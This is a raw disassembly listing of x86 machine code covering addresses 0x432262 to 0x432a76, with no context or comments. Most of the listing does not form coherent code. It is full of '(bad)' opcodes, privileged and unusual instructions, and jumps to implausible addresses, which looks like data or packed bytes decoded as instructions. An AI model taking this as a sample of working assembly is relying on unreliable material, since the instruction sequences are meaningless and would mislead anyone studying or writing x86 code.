  432262:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432268:	push   ebp
  432269:	mov    edi,eax
  43226b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432271:	push   ebp
  432272:	add    BYTE PTR [ebx-0x764b0777],al
  432278:	dec    DWORD PTR [esi+0x661851e8]
  43227e:	add    BYTE PTR [ebp-0x7b],dl
  432281:	cmp    esi,0x3
  432284:	dec    DWORD PTR [ecx+0x51fe9285]
  43228a:	jmp    DWORD PTR [esi-0x75]
  43228d:	push   ebp
  43228e:	hlt    
  43228f:	data16 (bad) 
  432291:	dec    ebp
  432292:	ret    
  432293:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432299:	lea    edx,[eax-0x1]
  43229c:	jne    0x43226f
  43229e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4322a4:	dec    BYTE PTR [ecx+0x51559eff]
  4322aa:	mov    DWORD PTR [esi-0x4c],esp
  4322ad:	push   ebp
  4322ae:	jmp    DWORD PTR [esi-0x18]
  4322b1:	inc    ebp
  4322b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4322b8:	(bad)  
  4322b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322ba:	inc    eax
  4322bc:	test   DWORD PTR [esi-0x2],esp
  4322bf:	inc    ebp
  4322c0:	dec    DWORD PTR [ebp-0x760bde75]
  4322c6:	(bad)  
  4322c7:	test   al,0xc3
  4322c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4322cf:	lods   al,BYTE PTR ds:[esi]
  4322d0:	push   eax
  4322d1:	inc    ebp
  4322d2:	jne    0x4322e3
  4322d4:	dec    DWORD PTR [ebp+0x8]
  4322d7:	mov    eax,DWORD PTR [edi]
  4322d9:	sbb    al,0x0
  4322db:	(bad)  
  4322dc:	mov    eax,0xc14fc3
  4322e1:	mov    DWORD PTR [eax-0x64],edi
  4322e4:	inc    bp
  4322e6:	test   DWORD PTR [edi],ecx
  4322e8:	dec    DWORD PTR [ebp-0x1]
  4322eb:	xor    eax,edi
  4322ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4322f3:	inc    ebp
  4322f4:	xor    DWORD PTR [ebx],0x43
  4322f7:	mov    WORD PTR [ebp-0x1bc],ax
  4322fe:	lea    ecx,[ecx-0x7677fe]
  432304:	inc    esi
  432305:	(bad)  
  432306:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43230d:	pushf  
  43230e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432315:	add    bh,bh
  432317:	add    BYTE PTR [edi],cl
  432319:	test   DWORD PTR [eax],eax
  43231b:	(bad)  
  43231c:	dec    WORD PTR [ebp-0xff002d]
  432323:	mov    DWORD PTR [eax-0x48],esi
  432326:	add    bh,bh
  432328:	lea    cx,[ebp-0x50]
  43232f:	push   eax
  432330:	rol    BYTE PTR [ebp+0x0],1
  432333:	xor    esp,DWORD PTR [esi+0x3]
  432336:	lea    edx,[eax-0x1]
  432339:	test   edi,edi
  43233b:	dec    DWORD PTR [ebp-0x1]
  43233e:	mov    edi,edi
  432340:	dec    eax
  432341:	clc    
  432342:	call   DWORD PTR [ebp-0x73]
  432345:	lea    esi,[eax+0x51ffff88]
  43234b:	lea    ecx,[ebp-0x78]
  43234e:	test   WORD PTR [ebp-0x2],ax
  432355:	popf   
  432356:	push   ecx
  432357:	add    BYTE PTR [ecx-0x77],dl
  43235a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432360:	cdq    
  432361:	mov    al,0x32
  432363:	inc    DWORD PTR [ebx]
  432365:	push   eax
  432366:	push   ecx
  432367:	inc    ebp
  432368:	shl    BYTE PTR [ebx],1
  43236a:	lea    eax,[ebx]
  43236c:	call   DWORD PTR [eax-0x1]
  43236f:	test   DWORD PTR [ebx],esi
  432371:	inc    DWORD PTR [eax-0x1]
  432374:	(bad)  
  432375:	(bad)  
  432376:	(bad)  
  432377:	clc    
  432378:	call   DWORD PTR [ebp+0x50]
  43237b:	jmp    0xcc24f5
  432380:	inc    esp
  432381:	jae    0x432382
  432383:	add    BYTE PTR [ecx-0x384f73],cl
  432389:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43238f:	mov    eax,DWORD PTR [ecx]
  432391:	data16 add BYTE PTR [ebp-0xb50077],al
  432398:	inc    eax
  43239a:	lea    esp,[esi+0x1c]
  43239d:	test   DWORD PTR [ecx-0xb301],ecx
  4323a3:	inc    edi
  4323a4:	(bad)  
  4323a5:	dec    si
  4323a7:	test   edi,edi
  4323a9:	push   DWORD PTR [ecx]
  4323ab:	(bad)  
  4323ac:	jnp    0x4323fd
  4323ae:	(bad)  
  4323af:	mov    edx,DWORD PTR [edx-0x7d]
  4323b2:	(bad)  
  4323b3:	mov    ebx,0x563a8935
  4323b8:	(bad)  
  4323b9:	call   FWORD PTR [esi-0x47]
  4323bc:	inc    DWORD PTR ds:0x893000e2
  4323c2:	(bad)  
  4323c3:	pop    eax
  4323c4:	mov    ah,0xff
  4323c6:	(bad)  
  4323c7:	mov    ecx,0x5745
  4323cc:	dec    DWORD PTR [ecx-0xf7a501]
  4323d2:	(bad)  
  4323d3:	mov    ecx,0x456108
  4323d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4323de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4323e4:	inc    BYTE PTR gs:[eax]
  4323e7:	inc    DWORD PTR [ebp-0x73]
  4323ea:	ss (bad) 
  4323ec:	pushf  
  4323ed:	inc    edi
  4323ef:	mov    ebx,eax
  4323f1:	hlt    
  4323f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4323f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4323fe:	lock into 
  432400:	test   eax,eax
  432402:	clc    
  432403:	mov    ebx,0x367245
  432408:	lahf   
  432409:	retf   
  43240a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432410:	add    edi,edi
  432412:	add    BYTE PTR [ecx+0x45],dl
  432415:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43241c:	mov    edx,DWORD PTR [ecx-0x74]
  43241f:	inc    DWORD PTR [eax]
  432421:	cld    
  432422:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432428:	add    BYTE PTR [ebp-0x1b0177],al
  43242e:	jge    0x432475
  432430:	test   DWORD PTR [ebx+0xff9875],ecx
  432436:	sbb    BYTE PTR [esi+0x55],ah
  432439:	xchg   ebp,eax
  43243a:	call   0x431f3e
  43243f:	push   edi
  432440:	inc    ebp
  432441:	mov    dx,WORD PTR [ebp-0xfc0075]
  432448:	cmp    al,0x85
  43244a:	ud0    eax,DWORD PTR [ebp-0x1]
  43244e:	test   DWORD PTR [edi+0x74],ecx
  432451:	dec    edi
  432452:	inc    DWORD PTR [ebp-0xf70004]
  432458:	dec    DWORD PTR [edi-0x75]
  43245b:	dec    edi
  43245c:	cld    
  43245d:	test   DWORD PTR [eax+0xff01ff],eax
  432463:	icebp  
  432464:	add    BYTE PTR [edi-0x3a],cl
  432467:	test   ebx,eax
  432469:	inc    BYTE PTR [ebp-0x1]
  43246c:	jne    0x43246e
  43246e:	mov    eax,DWORD PTR [eax]
  432470:	cld    
  432471:	xor    BYTE PTR [ecx+0x500155],cl
  432477:	push   ebp
  432478:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43247e:	add    BYTE PTR [ebp+0x35e90f50],al
  432484:	add    al,BYTE PTR [eax]
  432486:	add    BYTE PTR [ebx-0x38fe4f80],al
  43248c:	add    ah,ch
  43248e:	or     BYTE PTR [ebp+0x4501f845],dh
  432494:	jmp    0xdf278f
  432499:	(bad)  
  43249a:	nop    ecx
  43249d:	test   DWORD PTR [ebp+0x4502f8],eax
  4324a3:	cmp    BYTE PTR [ebp-0x64],cl
  4324a6:	mov    eax,edi
  4324a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4324ab:	add    eax,0x45fef885
  4324b0:	dec    DWORD PTR [ebx+0x339445]
  4324b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4324bc:	dec    DWORD PTR [ebx-0x460f0375]
  4324c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4324c3:	add    esi,edi
  4324c5:	add    bh,bh
  4324c7:	rdpmc  
  4324c9:	add    BYTE PTR [ebx],0x1
  4324cc:	mov    DWORD PTR [eax],eax
  4324ce:	add    al,0x45
  4324d0:	dec    DWORD PTR [ecx-0x360b3373]
  4324d6:	dec    DWORD PTR [esi]
  4324d8:	push   eax
  4324d9:	jne    0x432520
  4324db:	mov    esi,DWORD PTR [ebx]
  4324dd:	cld    
  4324de:	add    ebp,ebx
  4324e0:	push   eax
  4324e1:	inc    DWORD PTR [ebp-0x75]
  4324e4:	add    eax,0x800e4
  4324e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4324ef:	mov    DWORD PTR [ecx],eax
  4324f1:	sbb    al,0x0
  4324f3:	leave  
  4324f4:	test   DWORD PTR [edi-0x2],eax
  4324f7:	jne    0x4324f8
  4324f9:	call   0xff440ffe
  4324fe:	xor    BYTE PTR [ebp+0x4d],al
  432501:	mov    edi,edi
  432503:	enter  0x8,0x4d
  432507:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43250d:	mov    eax,DWORD PTR [eax]
  43250f:	cld    
  432510:	add    DWORD PTR [ecx],ebx
  432512:	inc    ebp
  432513:	dec    ebp
  432514:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43251a:	inc    eax
  43251b:	dec    DWORD PTR [ecx-0x270375]
  432521:	add    BYTE PTR [ebx-0x39d72701],cl
  432527:	xchg   ecx,eax
  432528:	ret    
  432529:	add    BYTE PTR [ebp-0x830075],al
  43252f:	add    BYTE PTR [ebp-0x75],al
  432532:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432538:	lea    edi,[edi-0xc]
  43253b:	add    bh,bh
  43253d:	mov    edx,DWORD PTR [eax-0x7b]
  432540:	inc    ebp
  432541:	rdpmc  
  432543:	jne    0x432548
  432545:	add    BYTE PTR [eax-0x75],dl
  432548:	inc    ebp
  432549:	clc    
  43254a:	add    eax,0x400009
  43254f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432555:	mov    eax,DWORD PTR [ecx]
  432557:	in     al,dx
  432558:	add    dh,al
  43255a:	test   ebx,eax
  43255c:	inc    BYTE PTR [ebp-0xff0001]
  432562:	add    BYTE PTR [ebp-0x43],al
  432565:	cmp    esi,0xfffffff8
  432568:	(bad)  
  432569:	push   DWORD PTR [eax]
  43256b:	add    BYTE PTR [ebp-0x3a],dl
  43256e:	test   ebx,eax
  432570:	je     0x4324f7
  432572:	mov    edi,edi
  432574:	sbb    al,0xff
  432576:	test   DWORD PTR gs:[eax],eax
  432579:	(bad)  
  43257a:	js     0x43257b
  43257c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432582:	sub    eax,ebx
  432584:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43258a:	add    eax,DWORD PTR [eax]
  43258c:	dec    ebp
  43258d:	push   eax
  43258e:	mov    al,BYTE PTR [ebp+0x1]
  432591:	mov    eax,DWORD PTR [ebp-0x68]
  432594:	mov    eax,DWORD PTR [eax]
  432596:	sbb    bh,al
  432598:	or     ah,dh
  43259a:	dec    ebp
  43259b:	inc    DWORD PTR [eax+0x4]
  43259e:	push   ecx
  43259f:	add    BYTE PTR [edx-0x1],dh
  4325a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4325a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4325b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4325b8:	push   ecx
  4325b9:	cmp    BYTE PTR [ebx],al
  4325bb:	inc    ebp
  4325bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4325c2:	(bad)  
  4325c3:	(bad)  
  4325c4:	in     al,0xff
  4325c6:	add    BYTE PTR [ebp+0x0],al
  4325c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4325cf:	add    al,bh
  4325d1:	(bad)  
  4325d2:	jmp    0x8d85:0x74b0558d
  4325d9:	dec    DWORD PTR [eax]
  4325db:	call   DWORD PTR [ebp-0x7b]
  4325de:	mov    edi,esi
  4325e0:	lock call DWORD PTR [ebp-0x75]
  4325e4:	mov    esi,esp
  4325e6:	mov    ah,0xc6
  4325e8:	mov    bh,0xc3
  4325ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4325f0:	add    DWORD PTR [eax],0x450050ff
  4325f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4325fc:	inc    edi
  4325fe:	push   esp
  432600:	jmp    0xcd00:0x670481ff
  432607:	mov    DWORD PTR [ebx],esi
  432609:	clc    
  43260a:	cmp    edi,0xff9cff3b
  432610:	jne    0x43261a
  432612:	mov    eax,eax
  432614:	add    esi,DWORD PTR [eax]
  432616:	int3   
  432617:	inc    ebp
  432618:	cmp    al,0x83
  43261a:	add    BYTE PTR [eax],bl
  43261c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432622:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432628:	mov    edi,eax
  43262a:	cmp    BYTE PTR [ebp+0x45],cl
  43262d:	jmp    0x4325ba
  43262f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432632:	inc    ebp
  432633:	or     al,0x2
  432635:	dec    DWORD PTR [ebp+0x18]
  432638:	jne    0x43268f
  43263a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432640:	mov    edi,DWORD PTR [ebx]
  432642:	in     al,0x50
  432644:	xchg   ecx,eax
  432645:	jmp    0x343754a
  43264a:	adc    al,0x8b
  43264c:	inc    ebp
  43264d:	mov    al,ds:0x8b04008b
  432652:	push   ebp
  432653:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432659:	push   ebp
  43265a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432660:	inc    ebp
  432661:	dec    ebp
  432662:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432668:	mov    DWORD PTR [eax],0xe9ff00f4
  43266e:	add    al,0x0
  432670:	add    BYTE PTR [eax],al
  432672:	mov    eax,edx
  432674:	push   eax
  432675:	rol    DWORD PTR [ebp-0xf0177],1
  43267b:	bound  eax,QWORD PTR [ebp+0x50]
  43267e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432684:	add    BYTE PTR [ecx+0x558df0ff],cl
  43268a:	mov    al,0xf
  43268c:	test   DWORD PTR [edx],edx
  43268e:	call   DWORD PTR [ebp-0x7a0001]
  432694:	(bad)  
  432695:	loop   0x432696
  432697:	jnp    0xc6991a9d
  43269d:	mov    eax,ebx
  43269f:	cmp    al,0x8b
  4326a1:	(bad)  
  4326a2:	cld    
  4326a3:	shr    esi,0xc
  4326a6:	add    dl,al
  4326a8:	push   eax
  4326a9:	lea    eax,[ebp-0x1]
  4326ac:	mov    edx,esi
  4326ae:	cwde   
  4326af:	cli    
  4326b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4326b6:	or     BYTE PTR [eax],cl
  4326b8:	inc    ebp
  4326b9:	dec    ebp
  4326ba:	inc    DWORD PTR [ebx+0x74803914]
  4326c0:	add    DWORD PTR [ebx+0x451800],ecx
  4326c6:	call   DWORD PTR [eax+edx*1]
  4326c9:	add    ecx,DWORD PTR [ebp-0x34]
  4326cc:	push   edi
  4326cd:	adc    al,0x8
  4326cf:	mov    edx,DWORD PTR [ebp-0x14]
  4326d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4326d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4326d9:	inc    DWORD PTR [eax+esi*8]
  4326dc:	inc    ebp
  4326dd:	stos   BYTE PTR es:[edi],al
  4326de:	mov    edx,DWORD PTR [ebp-0x4]
  4326e1:	add    DWORD PTR [ebp-0x1c],eax
  4326e4:	mov    edx,DWORD PTR [ebp-0x70]
  4326e7:	cmp    eax,DWORD PTR [eax]
  4326e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326ea:	mov    eax,DWORD PTR [eax]
  4326ec:	cld    
  4326ed:	jae    0x43266f
  4326ef:	add    eax,DWORD PTR [ecx]
  4326f1:	clc    
  4326f2:	add    BYTE PTR [eax+0x30],dl
  4326f5:	mov    DWORD PTR [ecx],esi
  4326f7:	clc    
  4326f8:	pop    ds
  4326f9:	inc    ebp
  4326fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432700:	(bad)  
  432701:	push   DWORD PTR [edi]
  432703:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432709:	(bad)  
  43270a:	jae    0x43270b
  43270c:	mov    eax,DWORD PTR [ebp-0x740175]
  432712:	sub    eax,DWORD PTR [eax]
  432714:	add    eax,DWORD PTR [eax]
  432716:	mov    DWORD PTR [ecx+0x5f],eax
  432719:	mov    DWORD PTR [ebx-0x4],ebx
  43271c:	ret    0xff
  43271f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432725:	ret    
  432726:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43272c:	add    BYTE PTR [ebp-0x7d],al
  43272f:	mov    DWORD PTR [eax],eax
  432731:	add    al,0x84
  432733:	inc    DWORD PTR [ecx]
  432735:	lea    eax,[eax]
  432737:	hlt    
  432738:	sar    bh,cl
  43273a:	test   BYTE PTR [eax+0x1],dl
  43273d:	inc    ebp
  43273e:	add    BYTE PTR [ebx],dh
  432740:	test   BYTE PTR [ebx],0x84
  432743:	push   eax
  432744:	add    BYTE PTR [ebp+0x0],al
  432747:	add    eax,0x86
  43274c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432752:	add    BYTE PTR [ecx],al
  432754:	add    BYTE PTR [eax],al
  432756:	mov    esi,0x550030
  43275b:	mov    ecx,DWORD PTR [edi]
  43275d:	cld    
  43275e:	fidiv  DWORD PTR [ebp+0x0]
  432761:	mov    edi,DWORD PTR [ecx]
  432763:	xor    BYTE PTR [eax+eax*1],0x84
  432767:	add    eax,DWORD PTR [eax]
  432769:	sbb    BYTE PTR [eax],al
  43276b:	jne    0x43271e
  43276d:	mov    eax,DWORD PTR [ecx]
  43276f:	sbb    BYTE PTR [eax],al
  432771:	mov    DWORD PTR [ebp-0x1],esp
  432774:	add    BYTE PTR [eax+0x30e45ca],bh
  43277a:	ret    0xb7fc
  43277d:	dec    ebp
  43277e:	or     al,0x89
  432780:	dec    ebp
  432781:	cld    
  432782:	cmovne ecx,DWORD PTR [eax-0x75]
  432786:	add    edi,esp
  432788:	seto   BYTE PTR [esi-0x72ffffff]
  43278f:	inc    ebp
  432790:	adc    al,0x8b
  432792:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432799:	cmp    DWORD PTR [edi+0x72],edx
  43279c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4327a2:	gs cmp al,0x0
  4327a5:	je     0x43277d
  4327a7:	push   eax
  4327a8:	sar    BYTE PTR [eax],1
  4327aa:	mov    bh,0x3e
  4327ac:	push   cs
  4327ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4327b3:	add    DWORD PTR [ecx+0x12],ebp
  4327b6:	dec    edx
  4327b7:	(bad)  
  4327b8:	mov    eax,edx
  4327ba:	in     al,dx
  4327bb:	adc    DWORD PTR [ecx],esi
  4327bd:	pop    esi
  4327be:	inc    ecx
  4327bf:	leave  
  4327c0:	or     DWORD PTR [eax],ebx
  4327c2:	gs push ebp
  4327c4:	add    ah,ch
  4327c6:	into   
  4327c7:	in     al,dx
  4327c8:	enter  0xb756,0xf0
  4327cc:	push   cs
  4327cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4327d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4327dd:	jnp    0x7443ace5
  4327e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4327e9:	add    BYTE PTR [edi],cl
  4327eb:	mov    edi,DWORD PTR [ecx-0x78]
  4327ee:	ltr    WORD PTR [ecx-0x7b]
  4327f2:	dec    DWORD PTR [edi]
  4327f4:	clc    
  4327f5:	out    0x45,eax
  4327f7:	add    BYTE PTR [eax],cl
  4327f9:	cmp    ebx,0xffffff8c
  4327fc:	jge    0x4327fe
  4327fe:	jb     0x432810
  432800:	je     0x522880
  432806:	pop    edx
  432807:	push   esi
  432808:	mov    ecx,DWORD PTR [edi]
  43280a:	in     al,dx
  43280b:	rol    DWORD PTR [ebp+0x0],1
  43280e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432815:	cmp    DWORD PTR [ecx],0xfffffff0
  432818:	hlt    
  432819:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43281f:	(bad)  
  432821:	push   eax
  432822:	jns    0xb8430ca0
  432828:	lock push cs
  43282a:	ror    edx,0x3
  43282d:	test   BYTE PTR [ecx+0x5500e800],cl
  432833:	dec    eax
  432834:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432838:	(bad)  
  432839:	mov    esi,0x7f33ff5f
  43283e:	inc    eax
  43283f:	test   DWORD PTR [edx],eax
  432841:	je     0x432803
  432843:	mov    ecx,ecx
  432845:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432849:	and    eax,DWORD PTR [eax+0xf0103]
  43284f:	jp     0x43283d
  432851:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432855:	add    edx,DWORD PTR [edi+0x74]
  432858:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43285e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432864:	je     0x4327e9
  432866:	cmp    eax,edi
  432868:	js     0x43288d
  43286a:	add    eax,0xeb0fc003
  43286f:	jns    0x4327fc
  432871:	vmread DWORD PTR [ecx+0x45],ebx
  432875:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43287b:	adc    al,0x8b
  43287d:	jge    0x432893
  43287f:	mov    edi,DWORD PTR [eax-0x4]
  432882:	add    edi,DWORD PTR [edi]
  432884:	or     bh,bh
  432886:	push   ebp
  432887:	push   es
  432888:	mov    DWORD PTR [ebp-0x4],ebx
  43288b:	add    edi,esi
  43288d:	pop    es
  43288e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432894:	mov    DWORD PTR [esp+esi*8],ecx
  432897:	inc    ebp
  432898:	pop    ebp
  432899:	xor    DWORD PTR [esi-0x4],0x3b
  43289d:	add    edx,DWORD PTR [ecx+edi*1]
  4328a0:	push   es
  4328a1:	clc    
  4328a2:	mov    bh,0xdb
  4328a4:	jp     0x43285d
  4328a6:	add    cl,BYTE PTR [esi]
  4328a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4328ae:	test   edi,edi
  4328b0:	je     0x4328a6
  4328b2:	mov    eax,ecx
  4328b4:	or     BYTE PTR [ebx],al
  4328b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4328bc:	jbe    0x432930
  4328be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4328c4:	add    ecx,DWORD PTR [esi]
  4328c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4328cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4328d2:	je     0x432921
  4328d4:	mov    DWORD PTR [ecx],edi
  4328d6:	mov    esi,eax
  4328d8:	hlt    
  4328d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4328e0:	jb     0x4328a2
  4328e2:	jmp    0x4328cf
  4328e4:	xor    esi,DWORD PTR [ebx]
  4328e6:	pop    edi
  4328e7:	pop    esi
  4328e8:	pop    ebx
  4328e9:	ret    
  4328ea:	ret    0x8b
  4328ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4328f3:	xor    DWORD PTR [esi],0xc
  4328f6:	pushf  
  4328f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4328fd:	(bad)  
  4328ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432906:	dec    ebp
  432907:	ret    
  432908:	mov    edi,DWORD PTR [esi-0x4]
  43290b:	pop    eax
  43290c:	dec    ebp
  43290d:	jne    0x43289a
  43290f:	xor    edi,esp
  432911:	inc    eax
  432912:	dec    ebp
  432913:	jbe    0x432968
  432915:	inc    eax
  432916:	pop    ebp
  432917:	add    edx,DWORD PTR [esi+0x8]
  43291a:	push   ecx
  43291b:	dec    eax
  43291c:	push   ecx
  43291d:	mov    eax,edi
  43291f:	and    al,0xf0
  432921:	jo     0x43290e
  432923:	mov    eax,DWORD PTR [ebx]
  432925:	sbb    BYTE PTR [ebp+0x4d],cl
  432928:	mov    eax,DWORD PTR [ebx]
  43292a:	nop
  43292b:	or     BYTE PTR [eax],al
  43292d:	jne    0x432986
  43292f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432935:	cld    
  432936:	xor    edi,edi
  432938:	add    edi,DWORD PTR [ebp+0x3]
  43293b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432941:	js     0x4328c7
  432943:	jae    0x432947
  432945:	(bad)  
  432947:	xor    al,0x5d
  432949:	jmp    0x4328d6
  43294b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432952:	fdecstp 
  432954:	test   BYTE PTR [edi],ah
  432956:	add    bh,BYTE PTR [ebp+0x0]
  432959:	add    ebx,DWORD PTR [ebp-0x77]
  43295c:	mov    edi,eax
  43295e:	cmp    al,0x0
  432961:	adc    dh,BYTE PTR [ebx]
  432963:	jge    0x432968
  432965:	mov    edi,DWORD PTR [ebx]
  432967:	jl     0x432978
  432969:	clc    
  43296a:	dec    edi
  43296b:	jge    0x43296d
  43296d:	mov    eax,DWORD PTR [ebx]
  43296f:	jb     0x432979
  432971:	mov    ecx,DWORD PTR [ebp-0x8]
  432974:	mov    edi,edi
  432976:	xor    edx,DWORD PTR [eax]
  432978:	add    edi,DWORD PTR [ebx]
  43297a:	mov    DWORD PTR [ebp-0x10],edi
  43297d:	inc    edi
  43297e:	pop    ebp
  43297f:	jge    0x4329bc
  432981:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432985:	mov    edx,0xc05d87f0
  43298a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  43298e:	fimul  WORD PTR [eax]
  432990:	fist   WORD PTR [ebp+0x1c]
  432993:	in     al,dx
  432994:	jne    0x432982
  432996:	mov    edi,DWORD PTR [edx-0x7a27a10]
  43299c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  4329a0:	fdivp  st(0),st
  4329a2:	fild   WORD PTR [ebp+0x4510f85c]
  4329a8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4329ae:	inc    ebp
  4329af:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4329b5:	mov    ebp,DWORD PTR [ebx-0x4]
  4329b8:	adc    al,0x8b
  4329ba:	rcl    DWORD PTR [eax],0x48
  4329bd:	mov    esi,0x7080803
  4329c2:	fiadd  WORD PTR [ebp+0x4d]
  4329c5:	mov    WORD PTR [ebx+0x558bfc52],cs
  4329cb:	cld    
  4329cc:	xor    ebx,DWORD PTR [ebx+0x330103]
  4329d2:	mov    DWORD PTR [edi+0x872dc],edi
  4329d8:	xlat   BYTE PTR ds:[ebx]
  4329d9:	into   
  4329da:	ffreep st(6)
  4329dc:	retf   0x6c7
  4329df:	iret   
  4329e0:	dec    ebp
  4329e1:	inc    ebp
  4329e2:	mov    DWORD PTR [ebx],edi
  4329e4:	fmul   QWORD PTR [edi]
  4329e6:	dec    ebp
  4329e7:	jnp    0x432a1c
  4329e9:	add    BYTE PTR [ebx],al
  4329eb:	mov    ecx,DWORD PTR [esp+edi*8]
  4329ee:	inc    ebp
  4329ef:	dec    ebp
  4329f0:	lea    esi,[ebx]
  4329f2:	add    DWORD PTR [ebx],eax
  4329f4:	jb     0x432a31
  4329f6:	add    BYTE PTR [edi],cl
  4329f8:	inc    ebp
  4329f9:	imul   eax,edi,0x858bd800
  4329ff:	cld    
  432a00:	clc    
  432a01:	mov    DWORD PTR [ebp+0x0],eax
  432a04:	inc    DWORD PTR [eax]
  432a06:	or     al,0xde
  432a08:	sbb    bh,0x1
  432a0b:	retf   
  432a0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432a13:	dec    ebp
  432a14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432a1a:	enter  0x12de,0xdf
  432a1e:	inc    ebp
  432a1f:	pop    ebp
  432a20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432a26:	add    DWORD PTR [edx],edx
  432a28:	add    BYTE PTR [ebp+0x50],dl
  432a2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432a31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432a37:	or     ah,al
  432a39:	pop    ss
  432a3a:	cdq    
  432a3b:	push   ebp
  432a3c:	clc    
  432a3d:	mov    eax,DWORD PTR [ebp-0x4]
  432a40:	xor    edx,edx
  432a42:	add    esi,DWORD PTR [ebx]
  432a44:	cmp    eax,DWORD PTR [ebx]
  432a46:	hlt    
  432a47:	cmp    DWORD PTR [ebx],esp
  432a49:	or     al,BYTE PTR [ebp+0xf]
  432a4c:	mov    eax,DWORD PTR [edx]
  432a4e:	loopne 0x432a50
  432a50:	(bad)  
  432a51:	mov    ecx,esi
  432a53:	cld    
  432a54:	pushf  
  432a55:	pop    ebp
  432a56:	cdq    
  432a57:	mov    esi,DWORD PTR [edx]
  432a59:	lock mov eax,eax
  432a5c:	adc    BYTE PTR [ebx],al
  432a5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432a65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432a6b:	dec    ebp
  432a6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432a72:	(bad)  
  432a73:	iret   
  432a74:	inc    ebp
  432a75:	(bad)  
  432a76:	jne    0x432ac5
